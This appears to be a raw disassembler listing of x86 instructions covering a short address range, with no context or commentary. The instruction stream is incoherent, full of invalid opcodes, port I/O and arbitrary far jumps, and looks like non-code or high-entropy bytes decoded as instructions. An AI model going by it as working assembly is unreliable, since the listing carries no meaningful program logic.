  42d637:	pop    esi
  42d638:	xchg   edx,eax
  42d639:	lahf   
  42d63a:	dec    edx
  42d63b:	popf   
  42d63c:	stos   DWORD PTR es:[edi],eax
  42d63d:	bound  esp,QWORD PTR ds:0xd202d40b
  42d643:	lea    eax,[edx-0x76c12b2b]
  42d649:	imul   eax,edx,0x7a
  42d64c:	cs add al,0xe6
  42d64f:	mov    esi,0xb5560225
  42d654:	nop
  42d655:	gs fucom st(6)
  42d658:	or     al,0x67
  42d65a:	popa   
  42d65b:	loope  0x42d5e6
  42d65d:	xchg   esi,eax
  42d65e:	xchg   esi,eax
  42d65f:	xor    BYTE PTR [ebp-0x1],dh
  42d662:	out    dx,eax
  42d663:	jle    0x42d6b6
  42d665:	cmp    al,0xac
  42d667:	ins    DWORD PTR es:[edi],dx
  42d668:	add    bh,BYTE PTR ds:[esi-0x1ca3d1af]
  42d66f:	scas   eax,DWORD PTR es:[edi]
  42d670:	mov    ebx,edi
  42d672:	daa    
  42d673:	arpl   WORD PTR [ebx],di
  42d675:	popa   
  42d676:	xchg   esp,eax
  42d677:	loope  0x42d613
  42d679:	add    eax,0x5f76b026
  42d67e:	sahf   
  42d67f:	jns    0x42d614
  42d681:	lds    esp,FWORD PTR [eax+0x19]
  42d684:	loopne 0x42d67c
  42d686:	mov    bl,0xa9
  42d688:	clc    
  42d689:	jbe    0x42d6ea
  42d68b:	mov    ecx,0x3001fb40
  42d690:	or     BYTE PTR [ecx+0x12081ef5],cl
  42d696:	push   ds
  42d697:	and    eax,eax
  42d699:	mov    edi,0x7a2cb51a
  42d69e:	mov    edi,0xafda78d0
  42d6a3:	adc    eax,0xef9f79e1
  42d6a8:	add    ch,al
  42d6aa:	(bad)  
  42d6ab:	std    
  42d6ac:	sub    DWORD PTR [ecx+0x5805d9a3],esp
  42d6b2:	ss mov ch,0xe7
  42d6b5:	aaa    
  42d6b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d6b7:	test   BYTE PTR [edx+0x7a2f7205],dl
  42d6bd:	(bad)  
  42d6be:	scas   al,BYTE PTR es:[edi]
  42d6bf:	push   ebx
  42d6c0:	mov    DWORD PTR [edi],edi
  42d6c2:	bound  ecx,QWORD PTR [esi]
  42d6c4:	mov    ds:0xda51dd77,al
  42d6c9:	add    eax,0xf3d6b76
  42d6ce:	sub    DWORD PTR [eax-0x769256ad],eax
  42d6d4:	adc    al,BYTE PTR ds:0x5788effc
  42d6da:	mov    esp,0x481c4b77
  42d6df:	xchg   esp,eax
  42d6e0:	add    al,0x6c
  42d6e2:	mov    ds:0x10b6e82e,al
  42d6e7:	fist   WORD PTR [eax]
  42d6e9:	mov    edx,0x9ff9d4e3
  42d6ee:	dec    esi
  42d6ef:	jecxz  0x42d6fa
  42d6f1:	jmp    0xf24a:0x5a76c087
  42d6f8:	ret    0x2a02
  42d6fb:	and    eax,0xc6cb66df
  42d700:	mov    ecx,edx
  42d702:	cs cld 
  42d704:	xlat   BYTE PTR ds:[ebx]
  42d705:	les    ebp,FWORD PTR [esi+0x7a02ca26]
  42d70b:	retf   0xfa9e
  42d70e:	mov    bl,0xe2
  42d710:	dec    ecx
  42d711:	sahf   
  42d712:	pop    ds
  42d713:	sti    
  42d714:	mov    ch,BYTE PTR [ecx]
  42d716:	into   
  42d717:	rol    BYTE PTR [esi-0x5c],1
  42d71a:	fs aam 0x1d
  42d71d:	sbb    dl,BYTE PTR [esi+0x19abed58]
  42d723:	outs   dx,BYTE PTR ds:[esi]
  42d724:	mov    edx,DWORD PTR [ebp+0x70]
  42d727:	mov    edi,0x4c7a133
  42d72c:	pusha  
  42d72d:	adc    edi,ebx
  42d72f:	xlat   BYTE PTR ds:[ebx]
  42d730:	sar    DWORD PTR [edi-0xb],cl
  42d733:	push   cs
  42d734:	repz jle 0x42d79a
  42d737:	je     0x42d6e4
  42d739:	dec    esi
  42d73a:	jp     0x42d751
  42d73c:	sbb    BYTE PTR [esi-0x295d5d6],ah
  42d742:	dec    ebp
  42d743:	mov    gs,eax
  42d745:	jmp    0x22ba:0x3717c1b5
  42d74c:	jb     0x42d751
  42d74e:	jp     0x42d79b
  42d750:	xchg   DWORD PTR [esi+0x7588e5e9],edx
  42d756:	(bad)  
  42d757:	mov    ebp,0x48739cf6
  42d75c:	int    0x5
  42d75e:	pop    esp
  42d75f:	push   ss
  42d760:	mov    edi,0x35cafecc
  42d765:	ret    0x211f
  42d768:	dec    ecx
  42d769:	pop    ebp
  42d76a:	inc    DWORD PTR [ecx]
  42d76c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d76d:	sbb    DWORD PTR [ebp+edx*8-0x2dee71f0],esi
  42d774:	out    0x97,eax
  42d776:	int3   
  42d777:	lods   al,BYTE PTR ds:[esi]
  42d778:	mov    BYTE PTR [ebx],ah
  42d77a:	mov    al,0xc4
  42d77c:	js     0x42d7fa
  42d77e:	mov    edi,0xb602cf2d
  42d783:	pop    esp
  42d784:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d785:	cmp    edx,0x1f
  42d788:	sbb    al,0x75
  42d78a:	fwait
  42d78b:	dec    edi
  42d78c:	jbe    0x42d7aa
  42d78e:	add    BYTE PTR [edx-0x7d],al
  42d791:	mov    esi,0x1408df7f
  42d796:	pop    eax
  42d797:	das    
  42d798:	lods   eax,DWORD PTR ds:[esi]
  42d799:	adc    al,0xbc
  42d79b:	(bad)  
  42d79c:	mov    ss,edi
  42d79e:	ins    BYTE PTR es:[edi],dx
  42d79f:	cdq    
  42d7a0:	sub    dl,BYTE PTR [ebx-0x2bcbd88f]
  42d7a6:	loopne 0x42d80a
  42d7a8:	add    esi,edx
  42d7aa:	pusha  
  42d7ab:	popa   
  42d7ac:	jmp    0xfc47:0x62ed2fc4
  42d7b3:	aam    0x58
  42d7b5:	cmp    ah,BYTE PTR [edx+0x3b632818]
  42d7bb:	or     BYTE PTR [ecx-0xa354cb5],0xf
  42d7c2:	or     al,0x2a
  42d7c4:	push   eax
  42d7c5:	add    edx,DWORD PTR [eax-0x19d7309e]
  42d7cb:	lods   eax,DWORD PTR ds:[esi]
  42d7cc:	cld    
  42d7cd:	mov    ecx,0x88b86997
  42d7d2:	in     al,0xbb
  42d7d4:	dec    edi
  42d7d5:	stos   BYTE PTR es:[edi],al
  42d7d6:	mov    eax,0x89804855
  42d7db:	sbb    eax,0xa0f8dc22
  42d7e0:	popf   
  42d7e1:	sbb    al,0x12
  42d7e3:	jle    0x42d7e5
  42d7e5:	dec    ecx
  42d7e6:	daa    
  42d7e7:	ja     0x42d7a8
  42d7e9:	int3   
  42d7ea:	dec    edi
  42d7eb:	sub    ch,0x4d
  42d7ee:	push   ds
  42d7ef:	push   ecx
  42d7f0:	push   ds
  42d7f1:	inc    esp
  42d7f2:	sub    ebx,DWORD PTR [ebp+0x7a]
  42d7f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d7f6:	(bad)
  42d7f9:	adc    al,0xca
  42d7fb:	adc    ebx,edi
  42d7fd:	lahf   
  42d7fe:	stos   DWORD PTR es:[edi],eax
  42d7ff:	sub    BYTE PTR [eax-0x76993613],dh
  42d805:	retf   
  42d806:	sub    ebx,DWORD PTR [esi-0x2a0d066c]
  42d80c:	retf   0x27fd
  42d80f:	mov    gs,WORD PTR [ebx+0x54]
  42d812:	mov    BYTE PTR [esi],dl
  42d814:	xchg   edi,eax
  42d815:	cmc    
  42d816:	ds cmc 
  42d818:	rol    dl,0x86
  42d81b:	mov    al,0x72
  42d81d:	and    al,0xfe
  42d81f:	aad    0x9e
  42d821:	pop    ss
  42d822:	sub    BYTE PTR [eax+0x13],dh
  42d825:	rol    BYTE PTR [eax],0xbf
  42d828:	mov    DWORD PTR [ebx+0x485a7014],esi
  42d82e:	inc    esp
  42d82f:	mov    edx,0x5920273
  42d834:	pusha  
  42d835:	sub    BYTE PTR [esp+ecx*1+0x37],cl
  42d839:	add    al,0x1f
  42d83b:	cdq    
  42d83c:	push   0xc86959f
  42d841:	pop    ebx
  42d842:	or     edx,edi
  42d844:	or     BYTE PTR [edi-0x52],cl
  42d847:	icebp  
  42d848:	cmp    DWORD PTR [eax-0x400e6ad6],edx
  42d84e:	mov    al,ds:0xbb1d89c7
  42d853:	neg    esp
  42d855:	cmp    BYTE PTR [ebp-0x55fcccb4],cl
  42d85b:	shr    DWORD PTR [edx+0x49],cl
  42d85e:	loope  0x42d81b
  42d860:	aaa    
  42d861:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d862:	pusha  
  42d863:	push   ecx
  42d864:	sahf   
  42d865:	lods   al,BYTE PTR ds:[esi]
  42d866:	imul   esi,DWORD PTR [ebx],0xffffff9c
  42d869:	add    al,0x9c
  42d86b:	aam    0x8c
  42d86d:	xor    eax,0xaeae93d3
  42d872:	out    dx,al
  42d873:	cmp    al,0x60
  42d875:	xor    BYTE PTR [esi],bl
  42d877:	sbb    ebp,DWORD PTR ds:0xb2d1b1ec
  42d87d:	sub    DWORD PTR [eax],edx
  42d87f:	stos   BYTE PTR es:[edi],al
  42d880:	push   ds
  42d881:	jnp    0x42d862
  42d883:	aas    
  42d884:	arpl   WORD PTR cs:[ebx],bx
  42d887:	ror    DWORD PTR [edx],1
  42d889:	in     eax,0x1f
  42d88b:	ror    DWORD PTR [eax+ebx*2],0xee
  42d88f:	test   eax,edx
  42d891:	stos   BYTE PTR es:[edi],al
  42d892:	xchg   ecx,eax
  42d893:	stos   BYTE PTR es:[edi],al
  42d894:	aas    
  42d895:	xor    eax,0xc216b207
  42d89a:	adc    DWORD PTR [edi],ecx
  42d89c:	pop    esi
  42d89d:	retf   
  42d89e:	pop    ebp
  42d89f:	mov    cl,0xc8
  42d8a1:	cwde   
  42d8a2:	adc    bh,dl
  42d8a4:	mov    cl,0x88
  42d8a6:	push   DWORD PTR [ecx+0x7c]
  42d8a9:	(bad)
  42d8ac:	ret    0x2b0
  42d8af:	leave  
  42d8b0:	sub    al,0x62
  42d8b2:	std    
  42d8b3:	out    0x89,eax
  42d8b5:	mov    cl,0x7c
  42d8b7:	inc    ebp
  42d8b8:	jno    0x42d86a
  42d8ba:	xchg   ebx,eax
  42d8bb:	jp     0x42d8ff
  42d8bd:	loopne 0x42d922
  42d8bf:	(bad)  
  42d8c0:	xchg   edi,eax
  42d8c1:	adc    DWORD PTR [eax],ecx
  42d8c3:	or     DWORD PTR [edx],esi
  42d8c5:	aas    
  42d8c6:	xchg   esi,eax
  42d8c7:	in     al,dx
  42d8c8:	inc    ebp
  42d8c9:	and    edx,DWORD PTR ds:0xd1598912
  42d8cf:	es mov ch,0x30
  42d8d2:	fist   DWORD PTR [esp+ecx*8]
  42d8d5:	pop    ds
  42d8d6:	inc    eax
  42d8d7:	mov    dl,0x28
  42d8d9:	adc    al,0xef
  42d8db:	in     eax,0x69
  42d8dd:	pop    ds
  42d8de:	jne    0x42d8db
  42d8e0:	mov    BYTE PTR [ecx],cl
  42d8e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d8e3:	xchg   esp,eax
  42d8e4:	xchg   ebx,eax
  42d8e5:	sub    ch,BYTE PTR [ebx]
  42d8e7:	scas   al,BYTE PTR es:[edi]
  42d8e8:	jnp    0x42d8ed
  42d8ea:	mov    ds:0xfdbb650,al
  42d8ef:	cmp    ebp,ebx
  42d8f1:	pop    ecx
  42d8f2:	pop    ds
  42d8f3:	div    DWORD PTR [eax]
  42d8f5:	pop    ds
  42d8f6:	js     0x42d974
  42d8f8:	and    BYTE PTR [esi],bl
  42d8fa:	mov    ebp,DWORD PTR [ebx-0x4d6e67c0]
  42d900:	adc    ebx,DWORD PTR [edx+eax*2]
  42d903:	lea    ebx,[eax+0x25]
  42d906:	mov    ecx,0x61126304
  42d90b:	popf   
  42d90c:	dec    ebp
  42d90d:	aad    0x7f
  42d90f:	pusha  
  42d910:	pop    esp
  42d911:	retf   
  42d912:	shl    al,0xd3
  42d915:	add    eax,0xfd9e0b4e
  42d91a:	ret    
  42d91b:	inc    ecx
  42d91c:	cmp    eax,0xd8cf1f57
  42d921:	pop    esp
  42d922:	jo     0x42d921
  42d924:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d925:	xlat   BYTE PTR ds:[ebx]
  42d926:	icebp  
  42d927:	(bad)  
  42d928:	inc    ebp
  42d929:	les    ecx,FWORD PTR [ebp+0x1f]
  42d92c:	in     al,0x17
  42d92e:	retf   
  42d92f:	or     al,0x9c
  42d931:	inc    eax
  42d932:	and    esi,DWORD PTR gs:[esi]
  42d935:	sti    
  42d936:	push   ebp
  42d937:	mov    BYTE PTR [edx+0x6b],ah
  42d93a:	loope  0x42d954
  42d93c:	ficomp WORD PTR ds:0x32d68ee
  42d942:	in     al,0xda
  42d944:	into   
  42d945:	stos   DWORD PTR es:[edi],eax
  42d946:	push   edi
  42d947:	ds push esi
  42d949:	push   esp
  42d94a:	jge    0x42d9b3
  42d94c:	jecxz  0x42d90e
  42d94e:	mov    WORD PTR [eax+edi*2-0x53],ss
  42d952:	gs repnz and eax,0xeb2d1002
  42d959:	sub    BYTE PTR [ebx+0x4f],ch
  42d95c:	cwde   
  42d95d:	addr16 pop ds
  42d95f:	shr    eax,0x29
  42d962:	mov    dl,0x30
  42d964:	retf   0xe021
  42d967:	lods   eax,DWORD PTR ds:[esi]
  42d968:	pusha  
  42d969:	rol    BYTE PTR [edx+0x75],1
  42d96c:	sti    
  42d96d:	adc    al,0x1f
  42d96f:	or     bl,BYTE PTR [esi-0x7216891e]
  42d975:	push   esi
  42d976:	fs daa 
  42d978:	sub    al,ah
  42d97a:	xchg   ebp,esi
  42d97c:	cdq    
  42d97d:	mov    WORD PTR [esi+edi*4+0x585a82d5],?
  42d984:	sahf   
  42d985:	and    eax,0x2b854d0a
  42d98a:	call   0xd8353a18
  42d98f:	mov    ecx,0xa6c14a5b
  42d994:	or     DWORD PTR [eax],ebx
  42d996:	sti    
  42d997:	cmp    dl,BYTE PTR [esi+0x22]
  42d99a:	push   ds
  42d99b:	sbb    esi,edx
  42d99d:	popf   
  42d99e:	mov    al,0xf8
  42d9a0:	inc    BYTE PTR [ecx+edi*1+0x36c5c6d4]
  42d9a7:	ret    0xc42b
  42d9aa:	repz (bad) 
  42d9ac:	mov    cl,bh
  42d9ae:	jl     0x42d943
  42d9b0:	push   es
  42d9b1:	(bad)  
  42d9b2:	jnp    0x42d9b4
  42d9b4:	jl     0x42da01
  42d9b6:	xor    BYTE PTR [ebx+0x7c],0x2
  42d9ba:	mov    bh,0xc2
  42d9bc:	bound  edi,QWORD PTR [eax]
  42d9be:	and    ebx,DWORD PTR [ebp+0x37d96988]
  42d9c4:	mov    edx,0x65cea96f
  42d9c9:	sbb    eax,0x8166fab2
  42d9ce:	mov    ds:0x2d28e9f0,eax
  42d9d3:	in     eax,dx
  42d9d4:	mov    bh,bh
  42d9d6:	fidiv  DWORD PTR [edx]
  42d9d8:	push   es
  42d9d9:	xor    edi,DWORD PTR [edx+0x57]
  42d9dc:	(bad)  
  42d9dd:	loopne 0x42da0f
  42d9df:	lds    esp,FWORD PTR [ebx+0x24]
  42d9e2:	cld    
  42d9e3:	out    dx,eax
  42d9e4:	jge    0x42d9fc
  42d9e6:	pop    esi
  42d9e7:	push   ecx
  42d9e8:	mov    cl,0x88
  42d9ea:	ror    BYTE PTR [ebp+0x7f],0x8e
  42d9ee:	add    bh,BYTE PTR [ecx+ecx*4+0xff1703d]
  42d9f5:	pop    ebx
  42d9f6:	mov    esi,0x3814106f
  42d9fb:	sbb    DWORD PTR [ebp+0x10],0x67bc1441
  42da02:	cwde   
  42da03:	mov    eax,0x798783b6
  42da08:	jae    0x42da0d
  42da0a:	mov    fs,esi
  42da0c:	adc    ah,BYTE PTR [ecx+0x37d8a9c]
  42da12:	inc    esp
  42da13:	mov    al,ds:0xa04c5058
  42da18:	push   0x4d
  42da1a:	pop    ds
  42da1b:	mov    ds:0x5d705e7a,eax
  42da20:	sub    BYTE PTR [eax+0x62],al
  42da23:	aad    0xb1
  42da25:	inc    ecx
  42da26:	lods   eax,DWORD PTR ds:[esi]
  42da27:	aaa    
  42da28:	sbb    BYTE PTR [ebx-0x4a76d905],ch
  42da2e:	jae    0x42da83
  42da30:	mov    eax,0x78874954
  42da35:	add    bh,BYTE PTR [ebx+eiz*8]
  42da38:	loop   0x42da7e
  42da3a:	xchg   esi,eax
  42da3b:	outs   dx,DWORD PTR ds:[esi]
  42da3c:	adc    DWORD PTR [ebp-0x2ef15ee1],eax
  42da42:	cli    
  42da43:	(bad)  [eax]
  42da45:	and    DWORD PTR [edx],0x50a825ad
  42da4b:	jp     0x42d9dd
  42da4d:	xlat   BYTE PTR ds:[ebx]
  42da4e:	pop    edi
  42da4f:	jp     0x42da45
  42da51:	cmp    DWORD PTR [edi],ebx
  42da53:	and    eax,0x8d24f855
  42da58:	and    al,0x11
  42da5a:	mov    ecx,edx
  42da5c:	sub    ecx,DWORD PTR [edx+0x4c]
  42da5f:	sub    bh,BYTE PTR [esi-0x41]
  42da62:	and    dl,cl
  42da64:	ret    0xd2e5
  42da67:	xchg   ecx,eax
  42da68:	imul   ebx,DWORD PTR [eax-0x1d143ae1],0x7b
  42da6f:	pop    esi
  42da70:	jne    0x42da01
  42da72:	je     0x42da78
  42da74:	dec    eax
  42da75:	push   0xef2a0760
  42da7a:	jmp    0xae01:0xd09b5360
  42da81:	xchg   DWORD PTR [esi+0x483b88ab],ebp
  42da87:	xor    BYTE PTR [esi+0x5ed404e6],ch
  42da8d:	xchg   ebp,eax
  42da8e:	aad    0xee
  42da90:	out    dx,al
  42da91:	nop
  42da92:	push   edx
  42da93:	ins    BYTE PTR es:[edi],dx
  42da94:	mov    ebx,DWORD PTR [ecx+0x14b0f4a0]
  42da9a:	jns    0x42db04
  42da9c:	inc    ecx
  42da9d:	lahf   
  42da9e:	and    edi,DWORD PTR [ebx+0x77]
  42daa1:	rcr    DWORD PTR [ebp+0x73],1
  42daa4:	cmp    DWORD PTR [edi],0x97faa2fe
  42daaa:	pop    ds
  42daab:	inc    ecx
  42daac:	pusha  
  42daad:	lods   al,BYTE PTR ds:[esi]
  42daae:	mov    ds:0x18800c10,eax
  42dab3:	xlat   BYTE PTR ds:[ebx]
  42dab4:	ret    
  42dab5:	fsubr  DWORD PTR [edi-0x183191f5]
  42dabb:	or     eax,0x2236098e
  42dac0:	or     al,0x7f
  42dac2:	mov    esp,0x787584f5
  42dac7:	aad    0x63
  42dac9:	ja     0x42da8a
  42dacb:	pop    edi
  42dacc:	jbe    0x42dabb
  42dace:	pop    esp
  42dacf:	sub    eax,0xf6b17389
  42dad4:	sub    DWORD PTR [edx+0xf7a1c8d],ebx
  42dada:	xor    al,0x9f
  42dadc:	test   al,0xc4
  42dade:	aam    0xd4
  42dae0:	dec    eax
  42dae1:	leave  
  42dae2:	push   0x1fd1f7e9
  42dae7:	mov    edi,0x8bca62b
  42daec:	xchg   edx,eax
  42daed:	jno    0x42da6f
  42daef:	mov    ecx,0x2bed0ca
  42daf4:	leave  
  42daf5:	inc    edx
  42daf6:	ret    
  42daf7:	xor    BYTE PTR [esi+0x22],dh
  42dafa:	pop    ds
  42dafb:	add    eax,0xd6351c14
  42db00:	push   ebp
  42db01:	adc    dl,bl
  42db03:	je     0x42dac1
  42db05:	xor    esi,DWORD PTR [ebx]
  42db07:	hlt    
  42db08:	in     al,dx
  42db09:	jle    0x42db29
  42db0b:	push   ecx
  42db0c:	inc    edx
  42db0d:	mov    ah,0xa5
  42db0f:	popf   
  42db10:	mov    ch,0x4a
  42db12:	adc    DWORD PTR [eax+0x22],edi
  42db15:	push   esp
  42db16:	lods   al,BYTE PTR ds:[esi]
  42db17:	aad    0x8c
  42db19:	inc    ecx
  42db1a:	add    BYTE PTR [ecx-0x7d],cl
  42db1d:	sbb    DWORD PTR [esi],ebx
  42db1f:	mov    cl,0x1d
  42db21:	or     BYTE PTR [ebp+0x731f804c],0x88
  42db28:	call   0xf4dc609f
  42db2d:	add    eax,0xb28780db
  42db32:	pop    ebp
  42db33:	mov    al,0x88
  42db35:	jno    0x42dad2
  42db37:	mov    al,0x93
  42db39:	aam    0x35
  42db3b:	adc    dh,BYTE PTR [ebp+eax*1+0x4ec08ca4]
  42db42:	repz fistp QWORD PTR ds:0x859f1f77
  42db49:	lods   al,BYTE PTR ds:[esi]
  42db4a:	add    eax,0xe89750c7
  42db4f:	aam    0xb4
  42db51:	enter  0xcb5b,0x63
  42db55:	pop    ecx
  42db56:	or     ebx,edx
  42db58:	mov    DWORD PTR ds:0x38ba0228,ecx
  42db5e:	fidiv  WORD PTR [ebp-0xb]
  42db61:	add    dh,BYTE PTR [eax-0x77]
  42db64:	lahf   
  42db65:	aad    0x4
  42db67:	sahf   
  42db68:	ja     0x42dbaf
  42db6a:	pop    ecx
  42db6b:	mov    edi,0x809e5c10
  42db70:	frstor [ecx]
  42db72:	sbb    ecx,DWORD PTR [eax+0x17]
  42db75:	adc    eax,0x4054a17a
  42db7a:	gs push esi
  42db7c:	scas   al,BYTE PTR es:[edi]
  42db7d:	pop    ecx
  42db7e:	mov    ds:0xc7027b07,eax
  42db83:	adc    al,0x35
  42db85:	test   eax,0x197a7cff
  42db8a:	test   BYTE PTR [edx],al
  42db8c:	add    ah,al
  42db8e:	push   0xffffffd5
  42db90:	jbe    0x42dc11
  42db92:	int3   
  42db93:	lods   al,BYTE PTR ds:[esi]
  42db94:	cld    
  42db95:	and    BYTE PTR [eax-0x4d],0xe8
  42db99:	stc    
  42db9a:	jb     0x42db29
  42db9c:	shl    BYTE PTR [ebp+0x15c5b80a],0x36
  42dba3:	cmp    eax,ecx
  42dba5:	sub    ebx,DWORD PTR [ebx+0x4509598e]
  42dbab:	icebp  
  42dbac:	lahf   
  42dbad:	and    BYTE PTR [eax-0x7b],0x63
  42dbb1:	es inc esi
  42dbb3:	(bad)  
  42dbb4:	xchg   DWORD PTR [edi],edx
  42dbb6:	xchg   edx,eax
  42dbb7:	dec    ebp
  42dbb8:	shl    DWORD PTR [esi-0x22],cl
  42dbbb:	mov    ah,0x80
  42dbbd:	mov    cl,0x8e
  42dbbf:	or     DWORD PTR [ecx-0x5972a0f],0x8572ffa4
  42dbc9:	ins    DWORD PTR es:[edi],dx
  42dbca:	loopne 0x42dbab
  42dbcc:	into   
  42dbcd:	add    eax,0x4f617b5a
  42dbd2:	inc    edx
  42dbd3:	fisttp QWORD PTR [ecx+0x10990a2b]
  42dbd9:	mov    DWORD PTR [edi],esi
  42dbdb:	(bad)  
  42dbdc:	jge    0x42dbe0
  42dbde:	into   
  42dbdf:	dec    ebp
  42dbe0:	sub    ch,cl
  42dbe2:	jle    0x42dc01
  42dbe4:	inc    esp
  42dbe5:	mov    esi,0xdd708945
  42dbea:	mov    bl,0xd4
  42dbec:	dec    esi
  42dbed:	push   ss
  42dbee:	push   eax
  42dbef:	daa    
  42dbf0:	ss dec ebp
  42dbf2:	pop    ds
  42dbf3:	in     eax,dx
  42dbf4:	pop    edx
  42dbf5:	push   es
  42dbf6:	push   eax
  42dbf7:	xor    bl,dh
  42dbf9:	int    0x53
  42dbfb:	inc    ecx
  42dbfc:	push   ebx
  42dbfd:	out    dx,al
  42dbfe:	pop    ds
  42dbff:	pushf  
  42dc00:	shr    DWORD PTR [edx],0x37
  42dc03:	retf   0x714f
  42dc06:	pop    ds
  42dc07:	inc    edi
  42dc08:	mov    ds:0xda0c12a9,al
  42dc0d:	daa    
  42dc0e:	(bad)  
  42dc10:	xadd   BYTE PTR [ebx+0x25],dh
  42dc14:	cmp    ecx,ebp
  42dc16:	clc    
  42dc17:	jb     0x42dba2
  42dc19:	or     DWORD PTR [ebx+0xff0a9e6],esi
  42dc1f:	mov    cl,0x67
  42dc21:	add    edx,edx
  42dc23:	pop    ds
  42dc24:	pop    ebp
  42dc25:	in     eax,0x65
  42dc27:	scas   al,BYTE PTR es:[edi]
  42dc28:	stc    
  42dc29:	aaa    
  42dc2a:	imul   ecx,DWORD PTR [ebp-0x498dd44a],0xcf8c4b07
  42dc34:	mov    DWORD PTR [ebx+0x2955b92],ebx
  42dc3a:	cli    
  42dc3b:	shr    DWORD PTR [edi],0x3c
  42dc3e:	loopne 0x42dc16
  42dc40:	mov    al,0x8e
  42dc42:	pop    ds
  42dc43:	(bad)
  42dc47:	xor    BYTE PTR [esi+ecx*4+0x5a],dh
  42dc4b:	aam    0x57
  42dc4d:	xchg   DWORD PTR [ebx+0x2b4e98c8],ebp
  42dc53:	dec    edx
  42dc54:	mov    bl,0xf1
  42dc56:	pop    ebx
  42dc57:	adc    BYTE PTR [esi],cl
  42dc59:	lods   eax,DWORD PTR ds:[esi]
  42dc5a:	inc    edx
  42dc5b:	pop    edx
  42dc5c:	fwait
  42dc5d:	bound  ebx,QWORD PTR [ebx-0x13]
  42dc60:	push   ebx
  42dc61:	bnd jl 0x42dc89
  42dc64:	outs   dx,DWORD PTR ds:[esi]
  42dc65:	mov    ebp,0x2b1c13df
  42dc6a:	daa    
  42dc6b:	jns    0xfec41802
  42dc71:	pop    ecx
  42dc72:	xchg   edi,eax
  42dc73:	push   cs
  42dc74:	push   ecx
  42dc75:	add    ecx,DWORD PTR [eax-0x672c3a5a]
  42dc7b:	add    ebp,edx
  42dc7d:	push   ss
  42dc7e:	push   ds
  42dc7f:	and    esp,0x4b
  42dc82:	jne    0x42dc41
  42dc84:	push   ss
  42dc85:	adc    eax,0xa692d54b
  42dc8a:	add    cl,al
  42dc8c:	(bad)  
  42dc8d:	or     DWORD PTR [eax+ebx*2],ecx
  42dc90:	mov    BYTE PTR [ebx+0x35],bh
  42dc93:	inc    esi
  42dc94:	sbb    dh,BYTE PTR [ebx-0x17]
  42dc97:	std    
  42dc98:	aam    0xf2
  42dc9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dc9b:	aad    0x10
  42dc9d:	loop   0x42dc27
  42dc9f:	add    eax,DWORD PTR [ebx+0x10b56396]
  42dca5:	es adc ah,0x42
  42dca9:	lahf   
  42dcaa:	pop    esp
  42dcab:	outs   dx,DWORD PTR ds:[esi]
  42dcac:	pop    esi
  42dcad:	jle    0x42dd0f
  42dcaf:	mov    edx,0x453475d3
  42dcb4:	mov    DWORD PTR [ebp+ecx*4-0x5e],ebp
  42dcb8:	loop   0x42dc70
  42dcba:	pusha  
  42dcbb:	xor    DWORD PTR [esi-0x55868b6c],ecx
  42dcc1:	cmp    DWORD PTR [edi-0x2b],ebp
  42dcc4:	fcos   
  42dcc6:	pop    ebx
  42dcc7:	cdq    
  42dcc8:	push   es
  42dcc9:	dec    eax
  42dcca:	dec    eax
  42dccb:	repz mov bh,0x1b
  42dcce:	push   0x44
  42dcd0:	or     DWORD PTR [eax+0x32],esi
  42dcd3:	push   edx
  42dcd4:	cdq    
  42dcd5:	or     cl,BYTE PTR [ebx]
  42dcd7:	retf   0x282
  42dcda:	mov    ah,0x44
  42dcdc:	js     0x42dcd4
  42dcde:	dec    esp
  42dcdf:	and    edi,DWORD PTR [edi]
  42dce1:	call   DWORD PTR [ebp+ebx*2+0x4a984b60]
  42dce8:	mov    ebp,ebp
  42dcea:	and    esp,DWORD PTR [esi-0x5a]
  42dced:	sbb    ebp,ebx
  42dcef:	jne    0x42dcb0
  42dcf1:	add    ch,dl
  42dcf3:	fwait
  42dcf4:	mov    ecx,es
  42dcf6:	lock jg 0x42dc81
  42dcf9:	sub    BYTE PTR [esi],bl
  42dcfb:	lods   eax,DWORD PTR ds:[esi]
  42dcfc:	dec    eax
  42dcfd:	cwde   
  42dcfe:	ss jne 0x42dd15
  42dd01:	test   DWORD PTR [edx-0x46],0x827eb236
  42dd08:	leave  
  42dd09:	mov    ebp,DWORD PTR [ecx+ecx*4]
  42dd0c:	sti    
  42dd0d:	push   ss
  42dd0e:	push   ds
  42dd0f:	fstp   QWORD PTR [ecx]
  42dd11:	(bad)  
  42dd13:	inc    edx
  42dd14:	cmp    eax,0xe4462413
  42dd19:	xchg   DWORD PTR [edi],ebx
  42dd1b:	xor    DWORD PTR [ebp-0x70205ba2],ecx
  42dd21:	jmp    0xf5c4488
  42dd26:	pop    ebp
  42dd27:	jl     0x42dd66
  42dd29:	cmp    ecx,edi
  42dd2b:	jp     0x42dda5
  42dd2d:	add    eax,DWORD PTR [esi+eiz*4]
  42dd30:	pop    ss
  42dd31:	sbb    bh,BYTE PTR [esi+0x1fad72a7]
  42dd37:	stc    
  42dd38:	adc    al,0x15
  42dd3a:	sbb    ch,0xe6
  42dd3d:	mov    eax,ds:0x3bbea7c8
  42dd42:	mov    bl,0x9e
  42dd44:	mov    BYTE PTR [ecx],al
  42dd46:	cdq    
  42dd47:	sub    DWORD PTR [ebx],esi
  42dd49:	xlat   BYTE PTR ds:[ebx]
  42dd4a:	pop    ds
  42dd4b:	leave  
  42dd4c:	(bad)  
  42dd4d:	sub    DWORD PTR [ecx-0x8],edx
  42dd50:	and    al,cl
  42dd52:	(bad)  
  42dd53:	aam    0x37
  42dd55:	push   esi
  42dd56:	test   DWORD PTR [edx-0x325ce7d7],ebx
  42dd5c:	mov    BYTE PTR [ecx-0x432f9abd],dl
  42dd62:	rcr    DWORD PTR [eax-0x7689e1b7],1
  42dd68:	in     eax,dx
  42dd69:	pop    edi
  42dd6b:	das    
  42dd6c:	or     ecx,ebp
  42dd6e:	pusha  
  42dd6f:	mov    al,0xae
  42dd71:	int    0xf1
  42dd73:	mov    ds:0x54715996,al
  42dd78:	rol    ch,0x43
  42dd7b:	sbb    eax,0x4ea40300
  42dd80:	in     al,0xc7
  42dd82:	or     eax,0x66e045c4
  42dd87:	cmp    DWORD PTR [ebx+0x5f54a8d8],esp
